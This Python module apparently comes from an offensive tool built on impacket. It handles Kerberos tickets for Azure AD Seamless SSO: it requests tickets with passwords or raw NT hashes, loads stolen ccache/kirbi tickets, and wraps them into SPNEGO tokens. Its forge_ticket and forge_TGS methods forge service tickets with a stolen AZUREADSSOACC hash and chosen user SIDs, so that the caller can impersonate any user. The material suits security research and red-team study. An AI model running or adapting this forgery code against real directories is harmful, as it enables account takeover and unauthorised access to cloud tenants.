import base64
import datetime

from impacket.krb5 import constants
from impacket.krb5.types import KerberosTime, Principal, Ticket
from impacket.krb5.kerberosv5 import KerberosError, getKerberosTGS, getKerberosTGT
from impacket.krb5.asn1 import AP_REQ, TGS_REP, seq_set, Authenticator as KerberosAuthenticator
from impacket.krb5.ccache import CCache

from impacket.spnego import SPNEGO_NegTokenInit, TypesMech

from pyasn1.codec.ber import decoder, encoder
from pyasn1.type.univ import noValue

from .ticketer import TICKETER, TICKETER_options
from .log import logger
from .helper import Helper


"""
class TicketStruct:
    KDC_REP: bytes = None
    cipher: bytes = None
    sessionKey: bytes = None
    oldSessionKey: bytes

    def __init__(self, ticket: dict = None, **kwargs:dict):
        if type(ticket) is dict:
            ticket.update(kwargs)
            kwargs = ticket

        self.KDC_REP = kwargs.get('KDC_REP',None)
        self.cipher = kwargs.get('cipher',None)
        self.sessionKey = kwargs.get('sessionKey',None)
        self.oldSessionKey = kwargs.get('oldSessionKey',None)
"""


class KerberosHelper:
    def __init__(self):
        self.dc_host: str = None
        self.domain: str = None
        self.username: str = None
        self.password: str = ''
        self.ntlm: str = None
        self.lmhash: bytes = None
        self.nthash: bytes = None
        self.aes_key: str = None
        self.user_tgt: bytes = None
        self.user_tgs: bytes = None
        self.domain_sid: str = None
        self.user_sid: str = None
        self.user_rid: str = None
        self.adssoacc_ntlm: str = None
        self.adssoacc_aes: str = None

        self.timeout: int = 5
        #self.resolver: Resolver = None
        self.spn : str = 'HTTP/autologon.microsoftazuread-sso.com'
        self.TGT : dict = None
        self.TGS : dict = None


    @staticmethod
    def from_options(options):
        self = KerberosHelper()
        
        ntlm = options.ntlm
        if ntlm is not None:
            ntlm = ntlm.split(":")
            if len(ntlm) == 1:
                (nthash,) = ntlm
                lmhash = nthash = nthash
            else:
                lmhash, nthash = ntlm
                if len(lmhash) == 0:
                    lmhash = nthash
        else:
            lmhash = nthash = ""
        
        try:
            self.lmhash = bytes.fromhex(lmhash)
            self.nthash = bytes.fromhex(nthash)
        except TypeError as e:
            logger.warning(f'Failed to read provided hash, ensure it is a valid hex - {str(e)}')
      

        if options.spn is not None:
            self.spn = options.spn

        if options.tgt is not None:
            self.user_tgt = Helper.maybe_read_file(options.tgt)

        if options.tgs is not None:
            self.user_tgs = Helper.maybe_read_file(options.tgs)

        if options.password is not None:
            self.password = options.password

        if options.user_sid is not None:
            self.user_sid = options.user_sid
            user_sid_parts = self.user_sid.split('-')
            self.domain_sid = '-'.join(user_sid_parts[:-1])
            self.user_rid = user_sid_parts[-1]

        if options.domain_sid is not None:
            self.domain_sid = options.domain_sid

        if options.user_rid is not None:
            self.user_rid = options.user_rid

        if self.user_rid is not None and self.domain_sid and not self.user_sid:
            self.user_sid = f'{self.domain_sid}-{self.user_rid}'

        self.domain = options.domain
        self.username = options.username
        self.aes_key = options.aes_key
        self.dc_host = options.dc_host
        self.adssoacc_ntlm = options.adssoacc_ntlm
        self.adssoacc_aes = options.adssoacc_aes
        
        # It's easy to implement TGT forgery using krbtgt, but is it really useful?
        #self.krbtgt_ntlm = options.krbtgt_ntlm 
        #self.krbtgt_aes = options.krbtgt_aes


        return self



    def get_TGT(self):
        
        if self.user_tgt:
            logger.debug('Trying to use the provided TGT')
            ccache = self.load_ticket(self.user_tgt)
            if ccache is not None:
                self.TGT = ccache.credentials[0].toTGT()

        if not self.TGT:
            logger.debug('Trying to acquire TGT using login credentials')
            self.TGT = self.request_TGT()

        if not self.TGT:
            logger.warning('Couldn\'t get valid TGT')

        return self.TGT


    def request_TGT(self):
        try:
            
            logger.debug(f"Getting TGT for {self.username}@{self.domain}")
            
            username = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, old_session_key, session_key = getKerberosTGT(
                username, self.password, self.domain, self.lmhash, self.nthash, self.aes_key, self.dc_host
            )
            
            logger.info(f"Got TGT for {self.username}@{self.domain}")

            self.TGT = {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': session_key, 'oldSessionKey': old_session_key}

            ccache = CCache()
            ccache.fromTGT(tgt, old_session_key, session_key)

            ccache_data = ccache.getData()
            krb_cred = ccache.toKRBCRED()

            #print(base64.b64encode(ccache_data).decode())
            logger.debug(base64.b64encode(krb_cred).decode())


        
        except KerberosError as e:
            if int(e.getErrorCode()) == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                logger.error('Failed to acquire TGT, invalid login credentials')
                logger.error(str(e))

            elif int(e.getErrorCode()) == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                # We might face this if the target does not support AES
                # So, if that's the case we'll force using RC4 by converting
                # the password to lm/nt hashes and hope for the best. If that's already
                # done, byebye.
                if (
                    self.lmhash == b""
                    and self.nthash == b""
                    and (self.aes_key == b"" or self.aes_key is None)
                    and self.TGT is None
                    and self.TGS is None
                ):
                    from impacket.ntlm import compute_lmhash, compute_nthash

                    logger.debug("Got KDC_ERR_ETYPE_NOSUPP, fallback to RC4")
                    self.lmhash = compute_lmhash(self.password)
                    self.nthash = compute_nthash(self.password)
                    return self.request_TGT()
                else:
                    raise
            else:
                
                raise

        return self.TGT


    # Can be used to forge TGS or TGT
    def forge_ticket(self, ntlm=None, aes_key=None, spn=None):
        ticketer_options = TICKETER_options()
        ticketer_options.duration = 10
        ticketer_options.target = self.username
        ticketer_options.user = self.username
        ticketer_options.domain = self.domain
        ticketer_options.domain_sid = self.domain_sid
        ticketer_options.user_id = self.user_rid
        ticketer_options.dc_ip = self.dc_host
        ticketer_options.nthash = ntlm
        ticketer_options.aesKey = aes_key
        ticketer_options.spn = spn
        ticketer = TICKETER(self.username, self.password, self.domain, ticketer_options)
        ticket, adIfRelevant = ticketer.createBasicTicket()
        if ticket is not None:
            encASorTGSRepPart, encTicketPart, pacInfos = ticketer.customizeTicket(ticket, adIfRelevant)
            return ticketer.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)
        return None

    def forge_TGS(self):
        TGS = self.forge_ticket(ntlm=self.adssoacc_ntlm, aes_key=self.adssoacc_aes, spn=self.spn)
        if TGS is not None:
            logger.info(f'Forged TGS for {self.username} - {self.user_rid}')
            tgs, cipher, session_key = TGS
            self.TGS = {'KDC_REP': tgs, 'cipher': cipher, 'sessionKey': session_key}

            ccache = CCache()
            ccache.fromTGS(tgs, session_key, session_key)
            krb_cred = ccache.toKRBCRED()
            logger.debug(base64.b64encode(krb_cred).decode())

            return self.TGS
        else:
            logger.debug(f'Failed to forge TGS for {self.username} - {self.user_rid}')


    def get_TGS(self):
        
        if self.user_tgs:
            logger.debug('Trying to use the provided TGS')
            ccache = self.load_ticket(self.user_tgs)
            if ccache is not None:
                self.TGS = ccache.credentials[0].toTGS()

        if not self.TGS:
            if self.adssoacc_ntlm or self.adssoacc_aes:
                logger.debug('Trying to forge TGS using AZUREADSSOACC hash')
                self.TGS = self.forge_TGS()
            else:
                logger.debug('Trying to acquire TGS')
                self.TGS = self.request_TGS()

        if not self.TGS:
            logger.warning('Couldn\'t get valid TGS')

        return self.TGS

        


    def request_TGS(self, spn: str = None):
        spn = spn if spn is not None else self.spn

        if not self.TGT:
            self.TGT = self.get_TGT()

        if type(self.TGT) is dict:
            tgt, cipher, session_key = self.TGT['KDC_REP'], self.TGT['cipher'], self.TGT['sessionKey']


            try:
                logger.debug(f"Getting TGS for {spn}")
                
                server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)

                tgs, cipher, old_session_key, session_key = getKerberosTGS(server_name, self.domain, self.dc_host, tgt, cipher, session_key)
                
                logger.info(f"Got TGS for {spn}")
                
                self.TGS = {'KDC_REP': tgs, 'cipher': cipher, 'sessionKey': session_key}

                ccache = CCache()
                ccache.fromTGS(tgs, old_session_key, session_key)
                ccache_data = ccache.getData()
                krb_cred = ccache.toKRBCRED()

                #print(base64.b64encode(ccache_data).decode())
                logger.debug(base64.b64encode(krb_cred).decode())

                
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # We might face this if the target does not support AES
                    # So, if that's the case we'll force using RC4 by converting
                    # the password to lm/nt hashes and hope for the best. If that's already
                    # done, byebye.
                    if (
                        self.lmhash == b""
                        and self.nthash == b""
                        and (self.aes_key == b"" or self.aes_key is None)
                        and self.TGT is None
                        and self.TGS is None
                    ):
                        from impacket.ntlm import compute_lmhash, compute_nthash

                        logger.debug("Got KDC_ERR_ETYPE_NOSUPP, fallback to RC4")
                        self.lmhash = compute_lmhash(self.password)
                        self.nthash = compute_nthash(self.password)
                        return self.request_TGS(spn)
                    else:
                        raise
                else:
                    raise
        else:
            logger.error('Acquiring TGS failed, could not find or acquire usable TGT')

        return self.TGS


    @staticmethod
    def load_ticket(ticket: bytes) -> CCache:
        ticket = Helper.maybe_base64_decode(ticket)

        try:
            logger.debug("Trying to load ticket as CCache")
            ccache = CCache(ticket)
            logger.info("Loaded ticket as CCache")
        except:
            logger.debug("Failed to load ticket as CCache")
            logger.debug("Trying to load ticket as Kirbi")
            ccache = CCache()

            try:
                ccache.fromKRBCRED(ticket)
                logger.info("Loaded ticket as Kirbi")
            except:
                logger.debug("Failed to load ticket as Kirbi")
                return None
        return ccache


    @staticmethod
    def tgs_to_spnego(TGS: dict):
        logger.debug('Compiling SPNEGO Service Request using TGS')
        if type(TGS) is dict:
            tgs, cipher, session_key = TGS['KDC_REP'], TGS['cipher'], TGS['sessionKey']

            decoded_ticket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]

            client_name = Principal()
            client_name.from_asn1(decoded_ticket, "crealm", "cname")

            username = "@".join(str(client_name).split("@")[:-1])
            domain = client_name.realm

            spnego_token = SPNEGO_NegTokenInit()

            spnego_token["MechTypes"] = [TypesMech["MS KRB5 - Microsoft Kerberos 5"]]

            ticket = Ticket()
            ticket.from_asn1(decoded_ticket["ticket"])

            ap_req = AP_REQ()
            ap_req["pvno"] = 5 #Kerberos V5
            ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)

            opts = []
            ap_req["ap-options"] = constants.encodeFlags(opts)
            seq_set(ap_req, "ticket", ticket.to_asn1)


            authenticator = KerberosAuthenticator()
            authenticator["authenticator-vno"] = 5
            authenticator["crealm"] = domain
            seq_set(authenticator, "cname", Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
            now = datetime.datetime.utcnow()

            authenticator["cusec"] = now.microsecond
            authenticator["ctime"] = KerberosTime.to_asn1(now)

            encoded_authenticator = encoder.encode(authenticator)
            encrypted_authenticator = cipher.encrypt(session_key, 11, encoded_authenticator, None)

            ap_req["authenticator"] = noValue
            ap_req["authenticator"]["etype"] = cipher.enctype
            ap_req["authenticator"]["cipher"] = encrypted_authenticator

            spnego_token["MechToken"] = encoder.encode(ap_req)
            
            logger.debug(f'SPNEGO token: {base64.b64encode(spnego_token.getData()).decode()}')
            
            return spnego_token.getData()
